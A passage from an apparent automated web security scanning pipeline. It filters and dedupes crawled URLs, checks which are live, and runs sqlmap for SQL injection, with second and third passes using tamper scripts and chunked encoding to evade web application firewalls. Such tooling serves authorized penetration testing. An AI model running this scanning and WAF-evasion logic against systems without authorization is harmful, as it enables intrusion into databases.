        echo "$output_file"; return 0
    fi

    if ! command -v sqlmap &>/dev/null; then
        log_warn "sqlmap not installed — skipping API SQLi testing"
        echo '{"module":"api_sqli_testing","status":"unavailable","candidates":0,"findings":0,"duration_seconds":0}' > "$output_file"
        echo "$output_file"; return 0
    fi

    # Input: Module 20's API-aware injectable URLs (full valid URLs with params)
    local api_sqli_src="$OUTPUT_DIR/20_api_deep_discovery/sqli_targets.txt"
    if [ ! -s "$api_sqli_src" ]; then
        log_warn "No API SQLi targets from Module 20 (sqli_targets.txt) — skipping"
        cat > "$output_file" << EOF
{
  "module": "api_sqli_testing",
  "status": "no_candidates",
  "candidates": 0,
  "findings": 0,
  "duration_seconds": $(( $(date +%s) - start_time ))
}
EOF
        echo "$output_file"; return 0
    fi

    # ── Dedup by INJECTION SHAPE + upgrade http→https where available ──────
    # Module 20 can emit tens of thousands of URLs that are the SAME endpoint
    # with different parameter VALUES (e.g. 41k × view_availability.asp?HID=N).
    # For SQLi the injection point is (host + path + param-name set), so one
    # representative per shape is enough — this collapses ~50k URLs to a few
    # hundred (the key is scheme/port-agnostic, so http, http:80 and https
    # variants of one shape all merge into a single representative).
    #
    # Then, for each http representative, we probe https on that host ONCE and,
    # if it responds, rewrite the target to https. Most http URLs here 301 to
    # https anyway; hitting https directly avoids the redirect that was tripping
    # sqlmap's WAF-block false positive — and drops http:80 targets whose host
    # is really served over TLS. Hosts with no https (curl 000) stay on http.
    local raw_total
    raw_total=$(count_lines "$api_sqli_src")
    local candidates="$base_dir/api_sqli_candidates.txt"
    local API_SQLI_HTTPS_UPGRADE="${API_SQLI_HTTPS_UPGRADE:-true}"
    API_SQLI_HTTPS_UPGRADE="$API_SQLI_HTTPS_UPGRADE" \
    local target_domain
    target_domain=$(jq -r '.pipeline_info.target // ""' "$MANIFEST_FILE" 2>/dev/null || true)
    API_SQLI_HTTPS_UPGRADE="$API_SQLI_HTTPS_UPGRADE" \
    ARISE_TARGET_DOMAIN="$target_domain" \
    python3 - "$api_sqli_src" "$candidates" << 'SHAPE_DEDUP'
import os, re, sys, socket, ssl
from urllib.parse import urlparse, parse_qs, urlunparse
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

src, out = sys.argv[1], sys.argv[2]
do_upgrade = os.environ.get('API_SQLI_HTTPS_UPGRADE', 'true') == 'true'
target_domain = os.environ.get('ARISE_TARGET_DOMAIN', '')

STATIC_EXT_RE = re.compile(
    r'\.(png|jpe?g|gif|svg|ico|webp|css|woff2?|ttf|eot|otf'
    r'|mp[34]|webm|zip|tar|gz|pdf|doc[x]?|xls[x]?|map)(\?|$)', re.I)

TRACKING_PARAMS = {
    'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_ad',
    'utm_term', 'utm_id', 'aff_id', 'aff', 'dcmp', 'btag', 'siteid',
    'clkid', 'rfr', 'ttp', 'bid',
    'af_sub1', 'af_sub2', 'af_sub3', 'af_sub4', 'af_sub5',
    'af_channel', 'af_siteid', 'af_referrer_uid', 'af_referrer_customer_id',
    'af_click_lookback', 'af_reengagement_window', 'af_xp',
    'shortlink', 'source_caller', 'is_retargeting',
    'c', 'pid', 'ref', 'gi', 'amp',
    'gclid', 'gclsrc', 'fbclid', 'msclkid', 'mi_ign', '_ga', '_gl',
}

THIRD_PARTY_DOMAINS = {
    'googletagmanager.com', 'google-analytics.com', 'doubleclick.net',
    'googlesyndication.com', 'facebook.net', 'fbcdn.net',
    'app.link', 'onelink.me', 'appsflyer.com', 'branch.io',
    'segment.com', 'mixpanel.com', 'sentry.io',
}

def is_junk(u, p):
    host = (p.hostname or '').lower()
    for tp in THIRD_PARTY_DOMAINS:
        if host == tp or host.endswith('.' + tp):
            return 'third-party'
    if target_domain and not (host == target_domain or host.endswith('.' + target_domain)):
        return 'off-target'
    if STATIC_EXT_RE.search(p.path):
        return 'static-asset'
    params = set(parse_qs(p.query).keys())
    if params and all(pk.lower() in TRACKING_PARAMS for pk in params):
        return 'tracking-only'
    return None

dropped = {'third-party': 0, 'off-target': 0, 'static-asset': 0, 'tracking-only': 0}

# 1) Dedup by scheme/port-agnostic injection shape (with junk filter).
best = {}
for line in open(src, errors='ignore'):
    u = line.strip()
    if not u:
        continue
    try:
        p = urlparse(u)
    except Exception:
        continue
    reason = is_junk(u, p)
    if reason:
        dropped[reason] = dropped.get(reason, 0) + 1
        continue
    host = (p.hostname or '').lower()
    params = tuple(sorted(parse_qs(p.query).keys()))
    key = (host, p.path, params)
    prev = best.get(key)
    if prev is None or (u.startswith('https://') and not prev.startswith('https://')):
        best[key] = u

reps = list(best.values())
if any(dropped.values()):
    drop_msg = ', '.join(f'{k}={v}' for k, v in dropped.items() if v)
    sys.stderr.write(f'api_sqli_junk_filtered: {drop_msg}\n')

# 2) Per-host https support probe (once per host), then upgrade http reps.
def https_ok(host):
    """True if https://host/ answers with any HTTP status (TLS reachable)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = Request('https://%s/' % host, method='HEAD',
                      headers={'User-Agent': 'ARISE-APISQLi'})
        urlopen(req, timeout=6, context=ctx)
        return True
    except HTTPError:
        return True          # got an HTTP status → TLS works
    except (URLError, ssl.SSLError, socket.timeout, OSError, ValueError):
        return False

upgraded = 0
if do_upgrade:
    support = {}
    for u in reps:
        p = urlparse(u)
        if p.scheme != 'http':
            continue
        host = (p.hostname or '').lower()
        if host not in support:
            support[host] = https_ok(host)
    new_reps = []
    seen = set()
    for u in reps:
        p = urlparse(u)
        if p.scheme == 'http' and support.get((p.hostname or '').lower()):
            # rebuild on https, dropping any :80 port
            netloc = p.hostname + ((':' + str(p.port)) if p.port and p.port != 80 else '')
            u2 = urlunparse(('https', netloc, p.path, p.params, p.query, p.fragment))
            if u2 != u:
                upgraded += 1
            u = u2
        if u not in seen:
            seen.add(u)
            new_reps.append(u)
    reps = new_reps

with open(out, 'w') as fh:
    for u in reps:
        fh.write(u + '\n')

# stderr summary for the shell log; stdout stays the count
sys.stderr.write('upgraded_to_https=%d\n' % upgraded)
print(len(reps))
SHAPE_DEDUP
    local total_candidates
    total_candidates=$(count_lines "$candidates")
    log_info "API SQLi candidates: $total_candidates unique injection shapes (from $raw_total raw URLs, http→https upgraded where available)"

    # Safety cap on the number of shapes fed to the (sequential) liveness gate,
    # so a pathological target can't stall the pipeline.
    local API_SQLI_GATE_MAX="${API_SQLI_GATE_MAX:-500}"
    if [ "$total_candidates" -gt "$API_SQLI_GATE_MAX" ]; then
        head -n "$API_SQLI_GATE_MAX" "$candidates" > "$candidates.capped" \
            && mv "$candidates.capped" "$candidates"
        total_candidates=$(count_lines "$candidates")
        log_info "Capped to $total_candidates shapes for liveness gate (API_SQLI_GATE_MAX)"
    fi

    # Liveness / soft-404 gate → validated list
    local validated="$base_dir/api_sqli_validated.txt"
    > "$validated"
    local skipped_dead=0
    if [ "$API_SQLI_LIVENESS" = "true" ] && command -v curl &>/dev/null; then
        log_info "Applying liveness/soft-404 gate to constructed URLs..."
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            if _api_sqli_liveness_ok "$url" "$base_dir"; then
                printf '%s\n' "$url" >> "$validated"
            else
                ((skipped_dead++))
            fi
        done < "$candidates"
    else
        cp "$candidates" "$validated"
        [ "$API_SQLI_LIVENESS" = "true" ] && log_warn "curl unavailable — skipping liveness gate"
    fi
    local validated_count
    validated_count=$(count_lines "$validated")
    log_info "Live testable API URLs: $validated_count (dropped $skipped_dead dead/soft-404)"

    if [ "$validated_count" -eq 0 ]; then
        cat > "$output_file" << EOF
{
  "module": "api_sqli_testing",
  "status": "no_live_candidates",
  "candidates": $total_candidates,
  "validated": 0,
  "skipped_dead": $skipped_dead,
  "findings": 0,
  "duration_seconds": $(( $(date +%s) - start_time ))
}
EOF
        echo "$output_file"; return 0
    fi

    local capped="$base_dir/api_sqli_capped.txt"
    head -n "$API_SQLI_MAX_URLS" "$validated" > "$capped"
    local test_count
    test_count=$(count_lines "$capped")
    log_info "Testing $test_count API URLs with sqlmap (capped at $API_SQLI_MAX_URLS)"

    # host→waf lookup from the manifest (reuse the same shape as Module 15)
    local waf_lookup_file="$base_dir/waf_lookup.tsv"
    jq -r '.hosts | to_entries[] | select(.value.waf_vendor != null and .value.waf_vendor != "none") | "\(.key)\t\(.value.waf_vendor)"' \
        "$MANIFEST_FILE" > "$waf_lookup_file" 2>/dev/null || true

    local sqli_dir="$base_dir/sqlmap_output"
    mkdir -p "$sqli_dir"
    local findings=0
    local waf_blocked_count=0
    local actually_tested=0
    local _api_sqli_status="completed"

    local sqli_start_ts=$(date +%s)
    while IFS= read -r url; do
        [ -z "$url" ] && continue

        # Module time budget — same guard as Module 15.
        local now_ts elapsed
        now_ts=$(date +%s); elapsed=$(( now_ts - sqli_start_ts ))
        if [ "$elapsed" -ge "$SQLI_MODULE_BUDGET" ]; then
            _api_sqli_status="timeout"
            log_warn "API SQLi module time budget (${SQLI_MODULE_BUDGET}s) exceeded — skipping remaining URLs"
            break
        fi
        ((actually_tested++))

        local host url_hash run_dir
        host=$(printf '%s' "$url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
        url_hash=$(printf '%s' "$url" | md5sum | cut -d' ' -f1)
        run_dir="$sqli_dir/$url_hash"
        mkdir -p "$run_dir"

        local host_waf=""
        host_waf=$(grep -F "$host" "$waf_lookup_file" 2>/dev/null | head -1 | cut -f2)
        if [ -n "$host_waf" ]; then
            log_info "  sqlmap [WAF: $host_waf]: $url"
        else
            log_info "  sqlmap [no WAF]: $url"
        fi

        local found="false" pass_log="" pass_used=""

        # Pass 1: clean baseline (SQLI_BASELINE_TECHNIQUE default BEUS — no time-based)
        if _sqli_run_sqlmap "$url" "$run_dir" "pass1_baseline" --technique="$SQLI_BASELINE_TECHNIQUE"; then
            found="true"; pass_log="$run_dir/pass1_baseline.log"; pass_used="baseline"
        fi

        # Pass 2 & 3 (WAF-bypass) run ONLY when the manifest reports a real WAF
        # for this host. Without this guard, hosts that merely redirect (http→
        # https) or return generic 403s trip _sqli_waf_blocked on every URL and
        # burn 3 full sqlmap passes each for nothing — the exact 3× blow-up that
        # stalled the pipeline. No known WAF ⇒ trust pass 1 and move on.
        if [ "$found" = "false" ] && [ -n "$host_waf" ]; then
            # Pass 2: WAF-tuned tamper retry
            if _sqli_waf_blocked "$run_dir/pass1_baseline.log"; then
                log_info "    WAF block detected, retrying with tamper scripts..."
                local tamper_chain
                tamper_chain=$(_sqli_tamper_for_waf "$host_waf")
                if _sqli_run_sqlmap "$url" "$run_dir" "pass2_tamper" \
                    --technique=BEU --tamper="$tamper_chain" --delay=1; then
                    found="true"; pass_log="$run_dir/pass2_tamper.log"; pass_used="waf_tamper"
                fi
            fi

            # Pass 3: chunked + error-based bypass
            if [ "$found" = "false" ] && _sqli_waf_blocked "$run_dir/pass2_tamper.log" 2>/dev/null; then
                log_info "    Still blocked, trying chunked + error-based only..."
                if _sqli_run_sqlmap "$url" "$run_dir" "pass3_chunked" \
                    --technique=E --tamper="chardoubleencode,between" --delay=2 --chunked; then
                    found="true"; pass_log="$run_dir/pass3_chunked.log"; pass_used="chunked_bypass"
                fi
            fi
        fi

        # Record result
        if [ "$found" = "true" ] && [ -f "$pass_log" ]; then
            local sqli_type sqli_param confidence
            sqli_type=$(grep -oP "Type: \K[^,]+" "$pass_log" 2>/dev/null | head -1)
            [ -z "$sqli_type" ] && sqli_type="unknown"
            sqli_param=$(grep -oP "Parameter: \K\S+" "$pass_log" 2>/dev/null | head -1)
            [ -z "$sqli_param" ] && sqli_param="unknown"

            confidence="high"
            echo "$sqli_type" | grep -qi "union" && confidence="medium"
            echo "$sqli_type" | grep -qi "time\|blind" && confidence="medium"
            [ "$pass_used" = "waf_tamper" ] && [ "$confidence" = "high" ] && confidence="medium"
            [ "$pass_used" = "chunked_bypass" ] && confidence="low"

            local finding_json
            finding_json=$(jq -nc \
                --arg url "$url" \
                --arg host "$host" \
                --arg sqli_type "$sqli_type" \
                --arg param "$sqli_param" \
                --arg confidence "$confidence" \
                --arg waf "$host_waf" \
                --arg pass "$pass_used" \
                '{url:$url,host:$host,type:$sqli_type,parameter:$param,confidence:$confidence,waf_vendor:$waf,detection_pass:$pass,detection_source:"api_deep_discovery"}')
            printf '%s\n' "$finding_json" >> "$results_jsonl"
            ((findings++))
            log_warn "  VULNERABLE (API): $host param=$sqli_param type=$sqli_type confidence=$confidence (pass=$pass_used)"

        elif _sqli_waf_blocked "$run_dir/pass1_baseline.log" 2>/dev/null; then
            ((waf_blocked_count++))
            log_info "    WAF-blocked after all passes: $host"
        fi

    done < "$capped"

    log_info "API SQLi testing completed: $findings findings, $waf_blocked_count WAF-blocked, from $test_count URLs"
    update_statistics "api_sqli_testing" "$findings"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "api_sqli_testing",
  "status": "$_api_sqli_status",
  "candidates": $total_candidates,
  "validated": $validated_count,
  "skipped_dead": $skipped_dead,
  "tested": $actually_tested,
  "findings": $findings,
  "waf_blocked": $waf_blocked_count,
  "source": "20_api_deep_discovery/sqli_targets.txt",
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Module 20.1 (API SQLi) $_api_sqli_status"
    echo "$output_file"
}

###################################################################################################

# Detect if a sqlmap log shows WAF interference
_sqli_waf_blocked() {
    local log_file="$1"
    [ ! -f "$log_file" ] && return 1
    grep -qiE "WAF/IPS|heuristic.*detected|403 Forbidden|406 Not Acceptable|429 Too Many|responded with 403|blocked|Access Denied" "$log_file" 2>/dev/null
}

module_sqli_testing() {
    local target="$1"
    log_section "MODULE 15: SQL Injection Testing (WAF-Aware)"

    local start_time=$(date +%s)
    mkdir -p "$OUTPUT_DIR/15_sqli_testing"
    local output_file="$OUTPUT_DIR/15_sqli_testing/$(make_iso_filename "$target" "sqli_testing" "results")"
    local results_jsonl="$OUTPUT_DIR/15_sqli_testing/sqli_results.jsonl"
    > "$results_jsonl"

    if ! command -v sqlmap &>/dev/null; then
        log_warn "sqlmap not installed, skipping SQL injection testing"
        cat > "$output_file" << EOF
{
  "module": "sqli_testing",
  "candidates": 0,
  "findings": 0,
  "waf_blocked": 0,
  "scanner_status": "unavailable",
  "duration_seconds": 0
}
EOF
        echo "$output_file"
        return 0
    fi

    # Gather SQLi candidate URLs from crawled URLs and param fuzzing
    local sqli_candidates="$OUTPUT_DIR/15_sqli_testing/sqli_candidates.txt"
    > "$sqli_candidates"

    local urls_file="$OUTPUT_DIR/09_crawling/all_urls.txt"

    if [ -f "$urls_file" ]; then
        if command -v gf &>/dev/null; then
            $GF sqli "$urls_file" >> "$sqli_candidates" 2>/dev/null || true
        fi
        grep -iE '(\?|&)(id|user|item|cat|order|sort|page|dir|file|report|type|name|query|field|row|table|from|sel|results|search|lang|keyword|year|view|val|token|num|key|pid|uid|gid)=' \
            "$urls_file" >> "$sqli_candidates" 2>/dev/null || true
    fi

    local dir_200="$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt"
    [ -f "$dir_200" ] && grep -F '?' "$dir_200" >> "$sqli_candidates" 2>/dev/null || true

    # Also pull from param fuzzing and gau
    for extra_src in "$OUTPUT_DIR/11_param_fuzzing/urls_with_params.txt" \
                     "$OUTPUT_DIR/01_asset_discovery/gau_urls.txt"; do
        [ -f "$extra_src" ] && grep -E '\?[^=]+=' "$extra_src" 2>/dev/null >> "$sqli_candidates" || true
    done

    # Primary feed: attack_routing.jsonl (Module 8B) — pre-classified sqli lane
    # covers both query-param AND path-param surfaces identified by url_classify.
    local routing_file="$OUTPUT_DIR/08_directory_discovery/attack_routing.jsonl"
    if [ -f "$routing_file" ]; then
        python3 - "$routing_file" >> "$sqli_candidates" << 'ROUTING_SQLI'
import json, sys
for line in open(sys.argv[1]):
    try:
        r = json.loads(line)
        if r.get("attack") == "sqli":
            u = r.get("url") or r.get("template", "")
            if u: print(u)
    except Exception: pass
ROUTING_SQLI
    fi

    # Pull API endpoints with SQLi-relevant query params from the intel engine —
    # these are confirmed live, so sqlmap won't waste time on dead URLs.
    local api_snapshot="$OUTPUT_DIR/16_api_security/intel/endpoints_snapshot.jsonl"
    if [ -f "$api_snapshot" ]; then
        python3 - "$api_snapshot" >> "$sqli_candidates" << 'API_SQLI'
import json, sys, re
SQLI_RE = re.compile(r'[?&](id|user|uid|item|cat|order|sort|page|type|name|query|q|field|search|lang|keyword|val|num|key|pid|gid|from|to|limit|offset|filter|report)=', re.I)
for line in open(sys.argv[1]):
    try:
        ep = json.loads(line)
        url = ep.get('url','')
        # Only include query-param URLs — path IDs are handled by api_sqli_testing
        if url and SQLI_RE.search(url): print(url)
    except Exception: pass
API_SQLI
    fi

    sort -u "$sqli_candidates" -o "$sqli_candidates"
    local total_candidates=$(count_lines "$sqli_candidates")
    log_info "SQLi candidates found (raw): $total_candidates (including API endpoints)"

    if [ "$total_candidates" -eq 0 ]; then
        log_info "No parameterized URLs to test for SQL injection"
        cat > "$output_file" << EOF
{
  "module": "sqli_testing",
  "candidates": 0,
  "findings": 0,
  "waf_blocked": 0,
  "scanner_status": "no_candidates",
  "duration_seconds": $(($(date +%s) - start_time))
}
EOF
        echo "$output_file"
        return 0
    fi

    # ── 5-layer pre-validation gate ──────────────────────────────────────
    # Layer 1: static junk filter (no network) — drop static assets,
    #          tracking-only params, third-party domains
    # Layer 2: live-host filter + WAF-catchall skip
    # Layer 3: dedup by (host, path, param-names)
    # Layer 4: URL-level liveness probe (curl) — route by status code:
    #          200/500 → pass, 403/401 → only if bypass confirmed, else drop
    # Layer 5: soft-404 detection (body-length vs random-path baseline)
    local capped_file="$OUTPUT_DIR/15_sqli_testing/sqli_capped.txt"
    local live_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    local bypass_file="$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl"
    local sqli_gate_log="$OUTPUT_DIR/15_sqli_testing/gate_log.txt"

    python3 - "$sqli_candidates" "$capped_file" "$SQLI_MAX_URLS" \
             "$live_hosts_file" "$MANIFEST_FILE" "$bypass_file" \
             "$sqli_gate_log" << 'SQLI_GATE'
import json, os, re, ssl, sys, socket, hashlib
from urllib.parse import urlsplit, parse_qs
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

candidates_path, out_path, cap_str = sys.argv[1], sys.argv[2], sys.argv[3]
hosts_file, manifest_file, bypass_file = sys.argv[4], sys.argv[5], sys.argv[6]
gate_log_path = sys.argv[7]
cap = int(cap_str)

log_lines = []
def log(msg):
    log_lines.append(msg)

# ── Layer 1: static junk definitions ─────────────────────────────────

STATIC_EXT_RE = re.compile(
    r'\.(png|jpe?g|gif|svg|ico|webp|bmp|tiff?|css|woff2?|ttf|eot|otf'
    r'|mp[34]|webm|ogg|wav|flac|avi|mov|mkv|zip|tar|gz|rar|7z'
    r'|pdf|doc[x]?|xls[x]?|ppt[x]?|map)(\?|$)', re.I)

TRACKING_PARAMS = {
    'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_ad',
    'utm_term', 'utm_id', 'utm_source_platform', 'utm_creative_format',
    'aff_id', 'aff', 'dcmp', 'btag', 'siteid', 'clkid',
    'rfr', 'ttp', 'bid',
    'af_sub1', 'af_sub2', 'af_sub3', 'af_sub4', 'af_sub5',
    'af_channel', 'af_siteid', 'af_referrer_uid', 'af_referrer_customer_id',
    'af_click_lookback', 'af_reengagement_window', 'af_xp',
    'shortlink', 'source_caller', 'is_retargeting',
    'c', 'pid', 'ref', 'gi', 'amp',
    'gclid', 'gclsrc', 'gbraid', 'wbraid', 'dclid',
    'fbclid', 'fb_action_ids', 'fb_action_types', 'fb_source',
    'msclkid', 'li_fat_id', 'twclid', 'ttclid', 'mc_cid', 'mc_eid',
    'mi_ign', 'mi_u', 'mi_ecmp', '_ga', '_gl', '_hsenc', '_hsmi',
    'hsa_cam', 'hsa_grp', 'hsa_ad', 'hsa_src', 'hsa_net',
    'oly_enc_id', 'oly_anon_id', 'vero_id', 'wickedid',
    'igshid', 'spm', 'scm',
}

THIRD_PARTY_DOMAINS = {
    'googletagmanager.com', 'google-analytics.com', 'analytics.google.com',
    'doubleclick.net', 'googlesyndication.com', 'googleadservices.com',
    'facebook.com', 'facebook.net', 'fbcdn.net',
    'twitter.com', 'x.com', 't.co',
    'linkedin.com', 'pinterest.com', 'reddit.com',
    'cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com',
    'fonts.googleapis.com', 'fonts.gstatic.com',
    'maxcdn.bootstrapcdn.com', 'stackpath.bootstrapcdn.com',
    'youtube.com', 'youtu.be', 'vimeo.com',
    'app.link', 'onelink.me', 'appsflyer.com', 'adjust.com',
    'branch.io', 'bit.ly', 'goo.gl', 'tinyurl.com',
    'recaptcha.net', 'hcaptcha.com',
    'sentry.io', 'bugsnag.com', 'newrelic.com', 'nr-data.net',
    'segment.com', 'segment.io', 'mixpanel.com', 'amplitude.com',
    'hotjar.com', 'clarity.ms', 'fullstory.com',
    'intercom.io', 'crisp.chat', 'zendesk.com', 'freshdesk.com',
    'stripe.com', 'js.stripe.com', 'paypal.com',
}

# ── Load external data ───────────────────────────────────────────────

live_hosts = set()
try:
    for line in open(hosts_file, errors='ignore'):
        line = line.strip()
        if line:
            try:
                h = urlsplit(line).netloc.split(':')[0]
                if h: live_hosts.add(h.lower())
            except Exception: pass
except FileNotFoundError: pass

# WAF-catchall hosts from manifest
catchall_hosts = set()
try:
    manifest = json.load(open(manifest_file))
    for h, d in manifest.get('hosts', {}).items():
        if d.get('catchall_detected'):
            catchall_hosts.add(h.lower())
except (FileNotFoundError, json.JSONDecodeError): pass

# Bypass-confirmed (host, path) pairs from discovery/bypass_403.py
bypass_confirmed = set()
try:
    for line in open(bypass_file, errors='ignore'):
        try:
            f = json.loads(line)
            if f.get('bypassed'):
                bp_url = urlsplit(f.get('url', ''))
                bp_host = bp_url.netloc.split(':')[0].lower()
                bypass_confirmed.add((bp_host, bp_url.path))
        except (json.JSONDecodeError, Exception): pass
except FileNotFoundError: pass

target_domain = ''
try:
    target_domain = manifest.get('pipeline_info', {}).get('target', '')
except Exception: pass

# ── Helpers ───────────────────────────────────────────────────────────

def is_third_party(host):
    for tp in THIRD_PARTY_DOMAINS:
        if host == tp or host.endswith('.' + tp):
            return True
    if target_domain and not (host == target_domain or host.endswith('.' + target_domain)):
        return True
    return False

def is_static_asset(path):
    return bool(STATIC_EXT_RE.search(path))

def is_tracking_only(params):
    if not params:
        return False
    return all(p.lower() in TRACKING_PARAMS for p in params)

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE

_soft404_cache = {}

def probe_url(url):
    """Probe a URL and return (status_code, body_length).
    Returns (0, 0) on connection failure."""
    try:
        req = Request(url, method='GET',
                      headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                               'AppleWebKit/537.36 (KHTML, like Gecko) '
                               'Chrome/120.0.0.0 Safari/537.36 ARISE-SQLiGate'})
        resp = urlopen(req, timeout=12, context=_ssl_ctx)
        body = resp.read(64 * 1024)
        return (resp.status, len(body))
    except HTTPError as e:
        try:
            body = e.read(64 * 1024)
            return (e.code, len(body))
        except Exception:
            return (e.code, 0)
    except (URLError, ssl.SSLError, socket.timeout, OSError, ValueError):
        return (0, 0)

def is_soft_404(url, body_len):
    """Compare body length against a random-path baseline on the same origin."""
    p = urlsplit(url)
    origin = f"{p.scheme}://{p.netloc}"
    if origin not in _soft404_cache:
        rand = hashlib.md5(origin.encode()).hexdigest()[:16]
        rand_url = f"{origin}/arise_soft404_{rand}"
        base_code, base_len = probe_url(rand_url)
        _soft404_cache[origin] = (base_code, base_len)
    base_code, base_len = _soft404_cache[origin]
    if base_len == 0:
        return False
    ratio = abs(body_len - base_len) / max(base_len, 1)
    return ratio < 0.05

# ── Main pipeline ────────────────────────────────────────────────────

stats = {'raw': 0, 'static_dropped': 0, 'tracking_dropped': 0,
         'third_party_dropped': 0, 'dead_host_dropped': 0,
         'catchall_dropped': 0, 'dedup_dropped': 0,
         'dead_url_dropped': 0, 'soft404_dropped': 0,
         'no_bypass_dropped': 0, 'passed': 0}

# Pass 1: static filtering + dedup (no network)
seen = set()
pre_validated = []
for line in open(candidates_path, errors='ignore'):
    u = line.strip()
    if not u: continue
    stats['raw'] += 1
    try:
        p = urlsplit(u)
        host = p.netloc.split(':')[0].lower()
        params = sorted(parse_qs(p.query, keep_blank_values=True).keys())
    except Exception:
        continue

    if is_third_party(host):
        stats['third_party_dropped'] += 1
        log(f"  DROP third-party: {u[:120]}")
        continue
    if is_static_asset(p.path):
        stats['static_dropped'] += 1
        log(f"  DROP static-asset: {u[:120]}")
        continue
    if is_tracking_only(params):
        stats['tracking_dropped'] += 1
        log(f"  DROP tracking-only: {u[:120]}")
        continue
    if live_hosts and host not in live_hosts:
        stats['dead_host_dropped'] += 1
        log(f"  DROP dead-host: {u[:120]}")
        continue
    if host in catchall_hosts:
        stats['catchall_dropped'] += 1
        log(f"  DROP WAF-catchall: {u[:120]}")
        continue

    key = (host, p.path, tuple(params))
    if key in seen:
        stats['dedup_dropped'] += 1
        continue
    seen.add(key)
    pre_validated.append(u)

log(f"\nAfter static filtering: {len(pre_validated)} URLs survive "
    f"(dropped {stats['static_dropped']} static, {stats['tracking_dropped']} tracking, "
    f"{stats['third_party_dropped']} third-party, {stats['dead_host_dropped']} dead-host, "
    f"{stats['catchall_dropped']} WAF-catchall, {stats['dedup_dropped']} dedup)")

# Pass 2: URL-level liveness probe + status-code routing
# Limit probing to 3x cap to avoid spending too long on curl
probe_limit = cap * 3
results = []
for i, u in enumerate(pre_validated):
    if len(results) >= cap:
        break
    if i >= probe_limit:
        log(f"  Probe limit ({probe_limit}) reached, stopping liveness checks")
        break

    p = urlsplit(u)
    host = p.netloc.split(':')[0].lower()
    code, body_len = probe_url(u)

    if code == 0:
        stats['dead_url_dropped'] += 1
        log(f"  DROP unreachable (000): {u[:120]}")
        continue

    if code in (404, 410):
        stats['dead_url_dropped'] += 1
        log(f"  DROP {code}: {u[:120]}")
        continue

    if code in (502, 503, 504):
        stats['dead_url_dropped'] += 1
        log(f"  DROP {code} server-error: {u[:120]}")
        continue

    if code in (401, 403):
        bp_key = (host, p.path)
        if bp_key in bypass_confirmed:
            log(f"  PASS {code} bypass-confirmed: {u[:120]}")
        else:
            stats['no_bypass_dropped'] += 1
            log(f"  DROP {code} no-bypass: {u[:120]}")
            continue

    if code == 200 and is_soft_404(u, body_len):
        stats['soft404_dropped'] += 1
        log(f"  DROP soft-404 (200 but body matches random path): {u[:120]}")
        continue

    # 200, 500, 301, 302, or bypass-confirmed 401/403 → pass
    stats['passed'] += 1
    log(f"  PASS {code} ({body_len}B): {u[:120]}")
    results.append(u)

with open(out_path, 'w') as f:
    f.write('\n'.join(results) + '\n' if results else '')

summary = (f"SQLi gate: {stats['raw']} raw → {len(results)} passed "
           f"(static={stats['static_dropped']} tracking={stats['tracking_dropped']} "
           f"3p={stats['third_party_dropped']} dead-host={stats['dead_host_dropped']} "
           f"catchall={stats['catchall_dropped']} dedup={stats['dedup_dropped']} "
           f"dead-url={stats['dead_url_dropped']} soft404={stats['soft404_dropped']} "
           f"no-bypass-401/403={stats['no_bypass_dropped']})")
log(f"\n{summary}")
print(summary, file=sys.stderr)

with open(gate_log_path, 'w') as f:
    f.write('\n'.join(log_lines) + '\n')
SQLI_GATE

    local test_count=$(count_lines "$capped_file")
    log_info "Testing $test_count URLs (capped at $SQLI_MAX_URLS)"

    # Build a host→waf lookup from the manifest
    local waf_lookup_file="$OUTPUT_DIR/15_sqli_testing/waf_lookup.tsv"
    jq -r '.hosts | to_entries[] | select(.value.waf_vendor != null and .value.waf_vendor != "none") | "\(.key)\t\(.value.waf_vendor)"' \
        "$MANIFEST_FILE" > "$waf_lookup_file" 2>/dev/null || true

    local sqli_dir="$OUTPUT_DIR/15_sqli_testing/sqlmap_output"
    mkdir -p "$sqli_dir"
    local findings=0
    local waf_blocked_count=0
    local actually_tested=0
    local _sqli_scanner_status="completed"

    local sqli_start_ts=$(date +%s)
    while IFS= read -r url; do
        [ -z "$url" ] && continue

        # ── Module time budget: stop testing once the wall-clock cap is hit so
        #    the pipeline can never stall for hours in SQLi again. ──
        local now_ts elapsed
        now_ts=$(date +%s); elapsed=$(( now_ts - sqli_start_ts ))
        if [ "$elapsed" -ge "$SQLI_MODULE_BUDGET" ]; then
            _sqli_scanner_status="timeout"
            log_warn "SQLi module time budget (${SQLI_MODULE_BUDGET}s) exceeded — skipping remaining URLs"
            break
        fi
        ((actually_tested++))

        local host
        host=$(printf '%s' "$url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
        local url_hash
        url_hash=$(printf '%s' "$url" | md5sum | cut -d' ' -f1)
        local run_dir="$sqli_dir/$url_hash"
        mkdir -p "$run_dir"

        # Look up WAF vendor for this host
        local host_waf=""
        host_waf=$(grep -F "$host" "$waf_lookup_file" 2>/dev/null | head -1 | cut -f2)

        if [ -n "$host_waf" ]; then
            log_info "  sqlmap [WAF: $host_waf]: $url"
        else
            log_info "  sqlmap [no WAF]: $url"
        fi

        local found="false"
        local pass_log=""
        local pass_used=""

        # ── Pass 1: clean baseline (no tamper, fresh session, drop cookies) ──
        # Uses SQLI_BASELINE_TECHNIQUE (default BEUS — no time-based blind, which
        # is what made this module wall-clock-bound).
        if _sqli_run_sqlmap "$url" "$run_dir" "pass1_baseline" \
            --technique="$SQLI_BASELINE_TECHNIQUE"; then
            found="true"
            pass_log="$run_dir/pass1_baseline.log"
            pass_used="baseline"
        fi

        # ── Pass 2: if WAF blocked pass 1, retry with WAF-tuned tamper scripts ──
